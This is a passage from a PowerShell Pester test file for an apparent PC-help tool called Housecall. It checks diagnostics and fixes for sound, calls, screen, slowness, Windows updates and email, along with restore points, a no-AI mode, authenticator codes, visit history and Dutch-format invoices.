        It "B1 finds '$($c.Finding)' when: $($c.Name)" { (Test-HcSound (& $sound $c.Change)).FindingId | Should Be $c.Finding }
    }

    It 'B1 offers speakers before screens, then a test sound, and can switch back' {
        $r = Test-HcSound (& $sound @{ Outputs = @((& $out 'LG TV (NVIDIA High Definition Audio)' $true), (& $out 'Dell U2415 (AMD High Definition Audio Device)'), (& $out 'Speakers')) })
        @($r.Actions | ForEach-Object { $_.FixId }) | Should Be @('setDefaultAudio', 'setDefaultAudio', 'testSound')
        $r.Actions[0].Target.Label | Should Be 'Speakers'
        $r.Actions[0].Target.PreviousId | Should Be 'id-LG TV (NVIDIA High Definition Audio)'
    }

    It 'B1 offers to unmute and to turn up, remembering the old volume' {
        $muted = Test-HcSound (& $sound @{ Outputs = @((& $out 'Speakers' $true $true 2)) })
        @($muted.Actions | ForEach-Object { $_.FixId }) | Should Be @('unmute', 'setVolume', 'testSound')
        $muted.Actions[1].Target.Previous | Should Be 2
    }

    It 'B1 names the output in the all-good finding' {
        (Test-HcSound (& $sound)).FindingArgs | Should Be @('Speakers (Realtek(R) Audio)')
    }

    $calls = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{
            Microphones = @([pscustomobject]@{ Id = 'm1'; Name = 'Microphone (Webcam)'; IsDefault = $true; Muted = $false; Volume = 80 })
            Cameras = @('HD Webcam'); Problems = @(); Blocks = @() }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    $block = { param($cap, $who, $name = $null, $machine = $false)
        [pscustomobject]@{ Capability = $cap; Who = $who; Name = $name; Key = "HKCU:\x\$cap"; Machine = $machine } }
    $callCases = @(
        @{ Name = 'everything allowed';              Change = @{};                                                           Finding = 'callsOk' }
        @{ Name = 'WhatsApp may not use the camera'; Change = @{ Blocks = @(& $block 'webcam' 'app' 'WhatsApp') };           Finding = 'privacyBlocked' }
        @{ Name = 'microphone off for the whole PC'; Change = @{ Blocks = @(& $block 'microphone' 'all' $null $true) };      Finding = 'privacyBlocked' }
        @{ Name = 'the microphone is muted';         Change = @{ Microphones = @([pscustomobject]@{ Id = 'm1'; Name = 'Mic'; IsDefault = $true; Muted = $true; Volume = 80 }) }; Finding = 'micMuted' }
        @{ Name = 'the microphone is at 3%';         Change = @{ Microphones = @([pscustomobject]@{ Id = 'm1'; Name = 'Mic'; IsDefault = $true; Muted = $false; Volume = 3 }) }; Finding = 'micLow' }
        @{ Name = 'no microphone';                   Change = @{ Microphones = @() };                                        Finding = 'noMic' }
        @{ Name = 'no camera';                       Change = @{ Cameras = @() };                                            Finding = 'noCamera' }
    )
    foreach ($c in $callCases) {
        It "B2 finds '$($c.Finding)' when: $($c.Name)" { (Test-HcCalls (& $calls $c.Change)).FindingId | Should Be $c.Finding }
    }

    It 'B2 says who is blocked from what, and allows it with the right fix' {
        $r = Test-HcCalls (& $calls @{ Blocks = @((& $block 'webcam' 'app' 'WhatsApp'), (& $block 'microphone' 'all' $null $true)) })
        $r.FindingArgs | Should Be @('No app on this PC', 'microphone')
        @($r.Actions | ForEach-Object { $_.FixId }) | Should Be @('allowAccessMachine', 'allowAccess')
        $r.Actions[1].Target.Label | Should Be 'WhatsApp, camera'
    }

    $screen = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{ Brightness = $null; ColorFilter = $false; HighContrast = $false; Magnifier = $false; Portrait = $false; Scale = 100; TextSize = 100 }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    It 'B3 finds a dark screen, colour filter, high contrast, magnifier and a turned screen' {
        (Test-HcScreen (& $screen)).FindingId | Should Be 'screenOk'
        (Test-HcScreen (& $screen @{ Brightness = 60 })).FindingId | Should Be 'screenOk'
        $dark = Test-HcScreen (& $screen @{ Brightness = 10 })
        $dark.FindingId | Should Be 'tooDark'
        $dark.Actions[0].Target.Previous | Should Be 10
        (Test-HcScreen (& $screen @{ ColorFilter = $true })).FindingId | Should Be 'colorFilter'
        (Test-HcScreen (& $screen @{ HighContrast = $true })).FindingId | Should Be 'highContrast'
        $mag = Test-HcScreen (& $screen @{ Magnifier = $true })
        $mag.FindingId | Should Be 'magnifier'
        $mag.Actions[0].FixId | Should Be 'closeMagnifier'
        (Test-HcScreen (& $screen @{ Portrait = $true })).FindingId | Should Be 'rotated'
    }

    It 'reads a privacy block from the registry, per app' {
        $script:ConsentStoreSaved = $script:ConsentStore
        $script:ConsentStore = 'Software\HousecallTest\ConsentStore'
        $base = "HKCU:\$script:ConsentStore\webcam"
        New-Item "$base\5319275A.WhatsAppDesktop_cv1g1gvanyjgm" -Force | Out-Null
        New-Item "$base\NonPackaged" -Force | Out-Null
        Set-ItemProperty $base -Name Value -Value 'Allow'
        Set-ItemProperty "$base\5319275A.WhatsAppDesktop_cv1g1gvanyjgm" -Name Value -Value 'Deny'
        Set-ItemProperty "$base\NonPackaged" -Name Value -Value 'Allow'
        try {
            $blocks = @(Get-HcPrivacyBlocks 'webcam')
            $blocks.Count | Should Be 1
            $blocks[0].Name | Should Be 'WhatsApp'
            $blocks[0].Key | Should Be "$base\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
        } finally {
            Remove-Item 'HKCU:\Software\HousecallTest' -Recurse -Force
            $script:ConsentStore = $script:ConsentStoreSaved
        }
    }

    It 'the audio bridge compiles and lists this PC''s outputs' {
        $outs = Get-HcAudioDevices 0
        $null -eq $outs | Should Be $false
        @($outs | Where-Object { $_.IsDefault }).Count | Should BeLessThan 2
    }

    It 'never shows a missing-string marker, in either language' {
        foreach ($lang in @('en', 'nl')) {
            $script:Lang = $lang
            $reports = @($soundCases | ForEach-Object { Test-HcSound (& $sound $_.Change) }) +
                       @($callCases | ForEach-Object { Test-HcCalls (& $calls $_.Change) }) +
                       @((Test-HcScreen (& $screen @{ Brightness = 10; Magnifier = $true; ColorFilter = $true; Portrait = $true })))
            foreach ($r in $reports) {
                @($r.Results | Where-Object { $_.Text -match '\[\w+(\.\w+)+\]' }).Count | Should Be 0
                @($r.Actions | ForEach-Object { Get-HcFixLabel $_ } | Where-Object { $_ -match '\[\w+(\.\w+)+\]' }).Count | Should Be 0
                $all = @('finding.' + $r.FindingId) + @($r.FindingArgs)
                (T @all) | Should Not Match '\{\d\}|^\['
            }
        }
        $script:Lang = 'en'
    }
}

Describe 'D: slow or freezing' {
    $script:Lang = 'en'
    $item = { param($name, $enabled = $true, $machine = $false)
        [pscustomobject]@{ Name = $name; Value = $name; Machine = $machine; Approved = 'HKCU:\x'; Enabled = $enabled } }
    $perf = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{
            Disk = [pscustomobject]@{ Drive = 'C:'; FreeGB = 180.5; SizeGB = 476.9; FreePercent = 38; Media = 'SSD' }
            RamGB = 16; MemoryUsed = 45; Cpu = 12
            Busy = @([pscustomobject]@{ Name = 'chrome'; Cpu = 5; MemoryMB = 900 })
            UptimeDays = 1
            Startup = @((& $item 'SecurityHealth'), (& $item 'Spotify'), (& $item 'OneDrive'))
            CrashApps = @(); Shutdowns = 0; BlueScreens = 0; Sizes = $null
        }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    $disk = { param($free, $pct, $media = 'SSD') [pscustomobject]@{ Drive = 'C:'; FreeGB = $free; SizeGB = 237; FreePercent = $pct; Media = $media } }
    $many = @(1..12 | ForEach-Object { & $item "App$_" })

    $slowCases = @(
        @{ Name = 'a healthy PC';              Change = @{};                                            Finding = 'slowOk' }
        @{ Name = 'a full disk';               Change = @{ Disk = (& $disk 3.1 1) };                    Finding = 'diskFull' }
        @{ Name = 'a nearly full disk';        Change = @{ Disk = (& $disk 20 9) };                     Finding = 'diskLow' }
        @{ Name = 'memory at 95%';             Change = @{ MemoryUsed = 95 };                           Finding = 'memoryFull' }
        @{ Name = 'the processor at 97%';      Change = @{ Cpu = 97 };                                  Finding = 'cpuBusy' }
        @{ Name = 'running for 23 days';       Change = @{ UptimeDays = 23 };                           Finding = 'longUptime' }
        @{ Name = 'Windows on an HDD';         Change = @{ Disk = (& $disk 180 38 'HDD') };             Finding = 'hddSystem' }
        @{ Name = '4 GB of memory';            Change = @{ RamGB = 3.9 };                               Finding = 'lowRam' }
        @{ Name = '12 startup programs';       Change = @{ Startup = $many };                           Finding = 'manyStartup' }
        @{ Name = '12 startup programs, off';  Change = @{ Startup = @(1..12 | ForEach-Object { & $item "App$_" $false }) }; Finding = 'slowOk' }
    )
    foreach ($c in $slowCases) {
        It "D1 finds '$($c.Finding)' when: $($c.Name)" { (Test-HcSlow (& $perf $c.Change)).FindingId | Should Be $c.Finding }
    }

    It 'D1 offers to stop startup programs, but never the ones that should stay' {
        $r = Test-HcSlow (& $perf @{ Startup = @((& $item 'SecurityHealth'), (& $item 'RtkAudUService'), (& $item 'OneDrive'), (& $item 'Spotify'), (& $item 'Steam' $true $true)) })
        @($r.Actions | ForEach-Object { "$($_.FixId) $($_.Target.Label)" }) | Should Be @('disableStartup Spotify', 'disableStartupMachine Steam')
    }

    It 'D1 offers to close a program hogging the processor, never a system process' {
        $hog = Test-HcSlow (& $perf @{ Cpu = 95; Busy = @([pscustomobject]@{ Name = 'FortniteClient-Win64-Shipping'; Cpu = 70; MemoryMB = 4200 }) })
        @($hog.Actions | Where-Object { $_.FixId -eq 'closeProcess' })[0].Target.Name | Should Be 'FortniteClient-Win64-Shipping'
        $sys = Test-HcSlow (& $perf @{ Cpu = 95; Busy = @([pscustomobject]@{ Name = 'svchost'; Cpu = 70; MemoryMB = 300 }) })
        @($sys.Actions | Where-Object { $_.FixId -eq 'closeProcess' }).Count | Should Be 0
    }

    It 'D2 looks at startup and the disk' {
        (Test-HcSlowStart (& $perf)).FindingId | Should Be 'startOk'
        (Test-HcSlowStart (& $perf @{ Startup = $many })).FindingId | Should Be 'manyStartup'
        (Test-HcSlowStart (& $perf @{ Startup = $many; Disk = (& $disk 180 38 'HDD') })).FindingId | Should Be 'hddSystem'
    }

    It 'D3 finds crashing programs, blue screens and sudden power-offs' {
        (Test-HcCrashes (& $perf)).FindingId | Should Be 'crashOk'
        $crash = Test-HcCrashes (& $perf @{ CrashApps = @([pscustomobject]@{ Name = 'WINWORD'; Count = 6 }) })
        $crash.FindingId | Should Be 'crashes'
        $crash.FindingArgs | Should Be @('WINWORD', 6)
        (Test-HcCrashes (& $perf @{ CrashApps = @([pscustomobject]@{ Name = 'WINWORD'; Count = 1 }) })).FindingId | Should Be 'someCrashes'
        (Test-HcCrashes (& $perf @{ BlueScreens = 2; CrashApps = @([pscustomobject]@{ Name = 'x'; Count = 9 }) })).FindingId | Should Be 'blueScreens'
        (Test-HcCrashes (& $perf @{ Shutdowns = 3 })).FindingId | Should Be 'shutdowns'
    }

    It 'D4 has its own findings, and offers the clean-ups that are worth it' {
        $full = Test-HcDiskSpace (& $perf @{ Disk = (& $disk 3.1 1); Sizes = [pscustomobject]@{ TempGB = 2.3; BinGB = 0.04; DownloadsGB = 12 } })
        $full.FindingId | Should Be 'spaceFull'
        @($full.Actions | ForEach-Object { $_.FixId }) | Should Be @('emptyTemp')
        $ok = Test-HcDiskSpace (& $perf @{ Sizes = [pscustomobject]@{ TempGB = 0.1; BinGB = 1.5; DownloadsGB = 1 } })
        $ok.FindingId | Should Be 'diskOk'
        $ok.FindingArgs | Should Be @('C:', 180.5)
        @($ok.Actions | ForEach-Object { $_.FixId }) | Should Be @('emptyRecycleBin')
        (Test-HcDiskSpace (& $perf @{ Disk = (& $disk 180 38 'HDD') })).FindingId | Should Be 'diskOk'
    }

    It 'switches a startup program off the way Task Manager does, and back' {
        $key = 'HKCU:\Software\HousecallTest\StartupApproved\Run'
        New-Item $key -Force | Out-Null
        try {
            $t = @{ Label = 'Spotify'; Approved = $key; Value = 'Spotify' }
            & $script:Fixes.disableStartup.Apply $t
            (Get-ItemProperty $key).Spotify[0] | Should Be 3
            & $script:Fixes.disableStartup.Undo $t
            $null -eq (Get-ItemProperty $key -ErrorAction SilentlyContinue).Spotify | Should Be $true
            Set-ItemProperty $key -Name Spotify -Value ([byte[]](2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)) -Type Binary
            $t2 = @{ Label = 'Spotify'; Approved = $key; Value = 'Spotify' }
            & $script:Fixes.disableStartup.Apply $t2
            & $script:Fixes.disableStartup.Undo $t2
            (Get-ItemProperty $key).Spotify[0] | Should Be 2
        } finally {
            Remove-Item 'HKCU:\Software\HousecallTest' -Recurse -Force
        }
    }

    It 'never shows a missing-string marker, in either language' {
        foreach ($lang in @('en', 'nl')) {
            $script:Lang = $lang
            $reports = @($slowCases | ForEach-Object { Test-HcSlow (& $perf $_.Change) }) +
                       @((Test-HcCrashes (& $perf @{ CrashApps = @([pscustomobject]@{ Name = 'x'; Count = 5 }); BlueScreens = 1; Shutdowns = 1 })),
                         (Test-HcDiskSpace (& $perf @{ Disk = (& $disk 3 1); Sizes = [pscustomobject]@{ TempGB = 2; BinGB = 2; DownloadsGB = 2 } })))
            foreach ($r in $reports) {
                @($r.Results | Where-Object { $_.Text -match '\[\w+(\.\w+)+\]' }).Count | Should Be 0
                @($r.Actions | ForEach-Object { Get-HcFixLabel $_ } | Where-Object { $_ -match '\[\w+(\.\w+)+\]|\{\d\}' }).Count | Should Be 0
                $all = @('finding.' + $r.FindingId) + @($r.FindingArgs)
                (T @all) | Should Not Match '\{\d\}|^\['
            }
        }
        $script:Lang = 'en'
    }
}

Describe 'E: Windows and updates' {
    $script:Lang = 'en'
    $now = [datetime]'2026-09-26 10:00'
    $upd = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{
            Now = $now; ServiceDisabled = $false; RebootPending = $false; PausedUntil = $null; Windows10 = $false
            History = [pscustomobject]@{ Known = $true; LastSuccess = [datetime]'2026-09-12'; Failures = @() }
            Disk = [pscustomobject]@{ Drive = 'C:'; FreeGB = 180; SizeGB = 476; FreePercent = 38; Media = 'SSD' }
        }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    $fail = [pscustomobject]@{ Known = $true; LastSuccess = [datetime]'2026-09-12'; Failures = @([pscustomobject]@{ Title = '2026-09 Cumulative Update'; Code = '0x800F0922' }) }

    $updCases = @(
        @{ Name = 'up to date';                 Change = @{};                                                               Finding = 'updatesOk' }
        @{ Name = 'Windows 10';                 Change = @{ Windows10 = $true };                                           Finding = 'windows10' }
        @{ Name = 'the service switched off';   Change = @{ ServiceDisabled = $true; Windows10 = $true };                  Finding = 'updateServiceDisabled' }
        @{ Name = 'paused until October';       Change = @{ PausedUntil = [datetime]'2026-10-10' };                        Finding = 'updatesPaused' }
        @{ Name = 'a pause that has run out';   Change = @{ PausedUntil = [datetime]'2026-08-01' };                        Finding = 'updatesOk' }
        @{ Name = 'a restart waiting';          Change = @{ RebootPending = $true };                                       Finding = 'rebootPending' }
        @{ Name = 'a failed update';            Change = @{ History = $fail };                                             Finding = 'updateFailures' }
        @{ Name = 'nothing for 80 days';        Change = @{ History = [pscustomobject]@{ Known = $true; LastSuccess = [datetime]'2026-07-08'; Failures = @() } }; Finding = 'updatesStale' }
        @{ Name = 'too little space';           Change = @{ Disk = [pscustomobject]@{ Drive = 'C:'; FreeGB = 4.2; SizeGB = 118; FreePercent = 3; Media = 'SSD' } }; Finding = 'updateSpace' }
    )
    foreach ($c in $updCases) {
        It "E1 finds '$($c.Finding)' when: $($c.Name)" { (Test-HcUpdates (& $upd $c.Change)).FindingId | Should Be $c.Finding }
    }

    It 'E1 offers the matching fixes' {
        @((Test-HcUpdates (& $upd @{ ServiceDisabled = $true })).Actions)[0].FixId | Should Be 'enableUpdateService'
        @((Test-HcUpdates (& $upd @{ PausedUntil = [datetime]'2026-10-10' })).Actions)[0].FixId | Should Be 'resumeUpdates'
        @((Test-HcUpdates (& $upd @{ History = $fail })).Actions)[0].FixId | Should Be 'resetUpdates'
        @((Test-HcUpdates (& $upd)).Actions).Count | Should Be 0
    }

    $err = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{ Activated = $true; ClockOffset = 1; RebootPending = $false; Crashes = @() }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    It 'E2 finds a wrong clock, no activation, a waiting restart and a crashing program' {
        (Test-HcErrors (& $err)).FindingId | Should Be 'errorsOk'
        $clock = Test-HcErrors (& $err @{ ClockOffset = -3700 })
        $clock.FindingId | Should Be 'clockWrong'
        $clock.FindingArgs | Should Be @(62)
        @($clock.Actions | ForEach-Object { $_.FixId }) | Should Be @('syncClock', 'repairWindows')
        (Test-HcErrors (& $err @{ ClockOffset = $null })).FindingId | Should Be 'errorsOk'
        (Test-HcErrors (& $err @{ Activated = $false })).FindingId | Should Be 'notActivated'
        (Test-HcErrors (& $err @{ RebootPending = $true })).FindingId | Should Be 'rebootPending'
        (Test-HcErrors (& $err @{ Crashes = @([pscustomobject]@{ Name = 'EXCEL'; Count = 2 }) })).FindingArgs | Should Be @('EXCEL')
    }

    It 'E3 finds a waiting restart, fast startup and a long uptime' {
        $sd = { param([hashtable]$c = @{}) $f = [pscustomobject]@{ RebootPending = $false; FastStartup = $false; UptimeDays = 1 }; foreach ($k in $c.Keys) { $f.$k = $c[$k] }; $f }
        (Test-HcShutdown (& $sd)).FindingId | Should Be 'shutdownOk'
        (Test-HcShutdown (& $sd @{ RebootPending = $true; FastStartup = $true })).FindingId | Should Be 'rebootPending'
        $fast = Test-HcShutdown (& $sd @{ FastStartup = $true })
        $fast.FindingId | Should Be 'fastStartup'
        $fast.Actions[0].FixId | Should Be 'disableFastStartup'
        (Test-HcShutdown (& $sd @{ UptimeDays = 30 })).FindingId | Should Be 'longUptime'
    }

    It 'never shows a missing-string marker, in either language' {
        foreach ($lang in @('en', 'nl')) {
            $script:Lang = $lang
            $reports = @($updCases | ForEach-Object { Test-HcUpdates (& $upd $_.Change) }) +
                       @((Test-HcErrors (& $err @{ ClockOffset = 900; Activated = $false; Crashes = @([pscustomobject]@{ Name = 'x'; Count = 1 }) })),
                         (Test-HcShutdown ([pscustomobject]@{ RebootPending = $true; FastStartup = $true; UptimeDays = 12 })))
            foreach ($r in $reports) {
                @($r.Results | Where-Object { $_.Text -match '\[\w+(\.\w+)+\]' }).Count | Should Be 0
                @($r.Actions | ForEach-Object { Get-HcFixLabel $_ } | Where-Object { $_ -match '\[\w+(\.\w+)+\]|\{\d\}' }).Count | Should Be 0
                $all = @('finding.' + $r.FindingId) + @($r.FindingArgs)
                (T @all) | Should Not Match '\{\d\}|^\['
            }
        }
        $script:Lang = 'en'
    }
}

Describe 'A4: email' {
    $script:Lang = 'en'
    It 'reads the domain from an address, or takes the domain itself' {
        ConvertTo-HcMailDomain ' Jan.Jansen@Ziggo.NL ' | Should Be 'ziggo.nl'
        ConvertTo-HcMailDomain 'kpnmail.nl' | Should Be 'kpnmail.nl'
        ConvertTo-HcMailDomain 'geen adres' | Should Be $null
    }
    It 'spots a typo of a known provider, but not the provider itself or a stranger' {
        Get-HcMailTypo 'zigo.nl' | Should Be 'ziggo.nl'
        Get-HcMailTypo 'hotmial.com' | Should Be 'hotmail.com'
        Get-HcMailTypo 'gmial.com' | Should Be 'gmail.com'
        Get-HcMailTypo 'ziggo.nl' | Should Be $null
        Get-HcMailTypo 'bakkerij-devries.nl' | Should Be $null
    }

    $mail = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{ Domain = 'ziggo.nl'; Provider = 'Ziggo'; Web = $null; Typo = $null; ReceivesMail = $true
            ImapHost = 'imap.ziggo.nl'; ImapMs = 30; SmtpHost = 'smtp.ziggo.nl'; SmtpMs = 20
            Apps = [pscustomobject]@{ Apps = @('Outlook'); RetiredMail = $false } }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    It 'finds typos, dead domains, unreachable servers and the retired Mail app' {
        $ok = Test-HcMail (& $mail)
        $ok.FindingId | Should Be 'mailOk'
        $ok.FindingArgs | Should Be @('Ziggo')
        (Test-HcMail (& $mail @{ Domain = 'zigo.nl'; Provider = $null; Typo = 'ziggo.nl' })).FindingId | Should Be 'mailTypo'
        (Test-HcMail (& $mail @{ Domain = 'hetnt.nl'; Provider = $null; ReceivesMail = $false })).FindingId | Should Be 'mailNoDomain'
        (Test-HcMail (& $mail @{ SmtpMs = -1 })).FindingId | Should Be 'mailServerDown'
        (Test-HcMail (& $mail @{ Apps = [pscustomobject]@{ Apps = @(); RetiredMail = $true } })).FindingId | Should Be 'mailAppRetired'
    }
    It 'offers webmail only where the address is known' {
        @((Test-HcMail (& $mail @{ Web = 'https://mail.google.com/'; Provider = 'Gmail' })).Actions)[0].FixId | Should Be 'openWebmail'
        @((Test-HcMail (& $mail)).Actions).Count | Should Be 0
    }
    It 'runs from the menu, asking for the address' {
        Mock Get-HcNetworkFacts { New-FakeFacts }
        Mock Get-HcMailFacts { & $mail }
        { Start-Housecall -Lang nl -Answers @('A4', 'jan@ziggo.nl', '', 'Q') } | Should Not Throw
        Assert-MockCalled Get-HcMailFacts -Times 1 -Exactly -Scope It -ParameterFilter { $Domain -eq 'ziggo.nl' }
    }
}

Describe 'More fixes, the restore point and -NoAI' {
    $script:Lang = 'en'
    It 'offers an adapter restart and a network reset where they help' {
        $noAddr = Test-HcInternet (New-FakeFacts @{ IPv4 = '169.254.1.1'; InternetMs = $null })
        @($noAddr.Actions | ForEach-Object { $_.FixId }) | Should Be @('renewIp', 'restartAdapter')
        $noAddr.Actions[1].Target.Name | Should Be 'Wi-Fi'
        @((Test-HcInternet (New-FakeFacts @{ DnsOk = $false; Web = $null })).Actions | ForEach-Object { $_.FixId }) | Should Be @('flushDns', 'resetWinsock')
    }
    It 'offers to uninstall a remote tool through its own uninstaller, and the browser''s notification page' {
        $tool = New-FakeTool -InstallDate ([datetime]'2026-09-24')
        $tool | Add-Member Processes @('AnyDesk')
        $tool | Add-Member Uninstall '"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --uninstall'
        $sites = @([pscustomobject]@{ Browser = 'Chrome'; Site = 'https://virus-alert.example'; Since = $null })
        $r = Test-HcSecurity (New-FakeSecurity @{ RemoteTools = @($tool); Notifications = $sites }) @('remote', 'notifications') 'cleanAll'
        @($r.Actions | ForEach-Object { $_.FixId }) | Should Be @('uninstallProgram', 'openNotifySettings')
        $r.Actions[0].Target.Command | Should Match '--uninstall'
        $r.Actions[1].Target.Browser | Should Be 'Chrome'
    }
    It 'runs an uninstall command with quotes and arguments correctly' {
        Mock Start-Process { }
        & $script:Fixes.uninstallProgram.Apply @{ Command = '"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --uninstall' }
        Assert-MockCalled Start-Process -Times 1 -Exactly -Scope It -ParameterFilter { $FilePath -eq 'C:\Program Files (x86)\AnyDesk\AnyDesk.exe' -and $ArgumentList -eq '--uninstall' }
        & $script:Fixes.uninstallProgram.Apply @{ Command = 'MsiExec.exe /X{1234-ABCD}' }
        Assert-MockCalled Start-Process -Times 1 -Exactly -Scope It -ParameterFilter { $FilePath -eq 'MsiExec.exe' -and $ArgumentList -eq '/X{1234-ABCD}' }
    }
    It 'makes a restore point once, before the first admin fix only' {
        Mock Checkpoint-Computer { }
        $script:IsAdmin = $true; $script:RestorePointDone = $false
        New-HcRestorePoint; New-HcRestorePoint
        Assert-MockCalled Checkpoint-Computer -Times 1 -Exactly -Scope It
        $script:IsAdmin = $false; $script:RestorePointDone = $false
        New-HcRestorePoint
        Assert-MockCalled Checkpoint-Computer -Times 1 -Exactly -Scope It
    }
    It 'carries on when Windows cannot make a restore point' {
        Mock Checkpoint-Computer { throw 'System restore is disabled' }
        $script:IsAdmin = $true; $script:RestorePointDone = $false
        { New-HcRestorePoint } | Should Not Throw
        $script:IsAdmin = $false
    }
    It '-NoAI hides the chat and treats ? and sentences as unknown' {
        Mock Get-HcEnvironment { [pscustomobject]@{ IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'; IsAdmin = $false; Online = $true } }
        Mock Invoke-HcAi { }
        $out = Start-Housecall -Lang en -NoAI -Answers @('?', 'my printer is broken', 'Q') 6>&1 | Out-String
        Assert-MockCalled Invoke-HcAi -Times 0 -Exactly -Scope It
        $out | Should Not Match 'AI chat'
    }
}

Describe 'Setup: Google Authenticator codes' {
    . (Join-Path $root 'tools\setup-ai.ps1') -FunctionsOnly
    It 'matches the RFC 6238 test values (SHA-1)' {
        $key = [Text.Encoding]::ASCII.GetBytes('12345678901234567890')
        Get-Totp $key 1 | Should Be '287082'            # T = 59
        Get-Totp $key 37037036 | Should Be '081804'     # T = 1111111109
        Get-Totp $key 41152263 | Should Be '005924'     # T = 1234567890 (RFC: 89005924)
    }
    It 'turns a secret into Base32 and back' {
        $bytes = [byte[]](1..20)
        $text = ConvertTo-Base32 $bytes
        $text | Should Match '^[A-Z2-7]{32}$'
        (ConvertFrom-Base32 $text) -join ',' | Should Be ($bytes -join ',')
        ConvertTo-Base32 ([Text.Encoding]::ASCII.GetBytes('foobar')) | Should Be 'MZXW6YTBOI'
    }
}

Describe 'Relay: unlock and visit memory' {
    Mock Get-HcEnvironment { [pscustomobject]@{ IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'; IsAdmin = $false; Online = $true } }

    It 'makes a stable 64-character id for this PC' {
        $a = Get-HcPcId
        $a | Should Match '^[0-9a-f]{64}$'
        Get-HcPcId | Should Be $a
    }

    It 'unlocks with a code, retries a wrong one, and skips on Enter' {
        $script:HcToken = $null
        $script:Calls = @()
        Mock Invoke-HcRelay {
            $script:Calls += $Body.action
            if ($Body.action -eq 'unlock' -and $Body.code -eq '111111') { return [pscustomobject]@{ Ok = $false; Status = 401; Data = $null; Error = 'wrong_code' } }
            if ($Body.action -eq 'unlock') { return [pscustomobject]@{ Ok = $true; Status = 200; Data = [pscustomobject]@{ token = 't.s'; expires = (Get-Date).AddHours(4).ToUniversalTime().ToString('o') }; Error = $null } }
            [pscustomobject]@{ Ok = $true; Status = 200; Data = [pscustomobject]@{ visits = @() }; Error = $null }
        }
        $script:HcInputQueue = New-Object System.Collections.Queue
        foreach ($a in @('111111', '222 222')) { $script:HcInputQueue.Enqueue($a) }
        Unlock-HcRelay | Should Be $true
        $script:HcToken | Should Be 't.s'
        Unlock-HcRelay | Should Be $true                    # already unlocked: no new code asked
        @($script:Calls | Where-Object { $_ -eq 'unlock' }).Count | Should Be 2

        $script:HcToken = $null
        $script:HcInputQueue = New-Object System.Collections.Queue
        $script:HcInputQueue.Enqueue('')
        Unlock-HcRelay | Should Be $false
        $script:HcInputQueue = $null
    }

    It 'shows "no earlier visits" for a PC without history, and the real error when the relay fails' {
        $script:HcToken = 't.s'; $script:HcTokenExpires = (Get-Date).AddHours(1)
        Mock Invoke-HcRelay { [pscustomobject]@{ Ok = $true; Status = 200; Data = [pscustomobject]@{ visits = @() }; Error = $null } }
        $empty = Get-HcVisits
        $empty.Ok | Should Be $true
        @($empty.Visits).Count | Should Be 0
        $out = Show-HcHistory ([pscustomobject]@{ Online = $true; Os = 'x'; IsAdmin = $false; PSVersion = [version]'5.1' }) 6>&1 | Out-String
        $out | Should Match 'No earlier visits'
        $out | Should Not Match 'cannot be reached'

        Mock Invoke-HcRelay { [pscustomobject]@{ Ok = $false; Status = 500; Data = $null; Error = 'database' } }
        $failed = Get-HcVisits
        $failed.Ok | Should Be $false
        $failed.Error | Should Be 'database'
        $out = Show-HcHistory ([pscustomobject]@{ Online = $true; Os = 'x'; IsAdmin = $false; PSVersion = [version]'5.1' }) 6>&1 | Out-String
        $out | Should Match 'error \(database\)'
    }

    It 'saves the visit at the end, with the codes found and the fixes made, but not in a dry run' {
        $script:Saved = $null
        Mock Invoke-HcRelay {
            if ($Body.action -eq 'unlock') { return [pscustomobject]@{ Ok = $true; Status = 200; Data = [pscustomobject]@{ token = 't.s'; expires = (Get-Date).AddHours(4).ToUniversalTime().ToString('o') }; Error = $null } }
            if ($Body.action -eq 'visit_save') { $script:Saved = $Body }
            [pscustomobject]@{ Ok = $true; Status = 200; Data = [pscustomobject]@{ visits = @() }; Error = $null }
        }
        Mock Get-HcNetworkFacts { New-FakeFacts }
        Start-Housecall -Lang nl -Answers @('A1', '', 'Q', '123456', 'mevr. de Vries')
        $script:Saved.pc | Should Match '^[0-9a-f]{64}$'
        $script:Saved.label | Should Be 'mevr. de Vries'
        @($script:Saved.problems)[0].code | Should Be 'A1'
        @($script:Saved.problems)[0].finding | Should Be 'allGood'
        $script:Saved.lang | Should Be 'nl'

        $script:Saved = $null
        Start-Housecall -Lang nl -DryRun -Answers @('A1', '', 'Q')
        $script:Saved | Should Be $null
    }
}

Describe 'The invoice' {
    $script:Lang = 'nl'
    $euro = [string][char]0x20AC

    It 'writes money the Dutch way and reads amounts people type' {
        Format-HcMoney 30 | Should Be "$euro 30,00"
        Format-HcMoney 1234.5 | Should Be "$euro 1.234,50"
        ConvertTo-HcAmount '19,95' | Should Be 19.95
        ConvertTo-HcAmount "$euro 12.50" | Should Be 12.5
        ConvertTo-HcAmount 'twintig' | Should Be $null
        $line = ConvertTo-HcExtraLine 'Draadloze muis 19,95'
        $line.Description | Should Be 'Draadloze muis'
        $line.Amount | Should Be 19.95
        ConvertTo-HcExtraLine 'alleen tekst' | Should Be $null
    }

    It 'suggests the time spent, rounded up to a quarter of an hour' {
        $script:HcStartedAt = (Get-Date).AddMinutes(-37)
        Get-HcSuggestedMinutes | Should Be 45
        $script:HcStartedAt = (Get-Date).AddMinutes(-3)
        Get-HcSuggestedMinutes | Should Be 15
    }

    $seller = [pscustomobject]@{ business_name = 'Shamil PC Hulp'; owner_name = 'Shamil'; address = 'Straat 1'; postcode_city = '1234 AB Utrecht'
        kvk = '12345678'; btw_number = $null; iban = 'NL00BANK0123456789'; email = 'shamilimanuel@outlook.com'; phone = $null }
    $invoice = { param([hashtable]$c = @{})
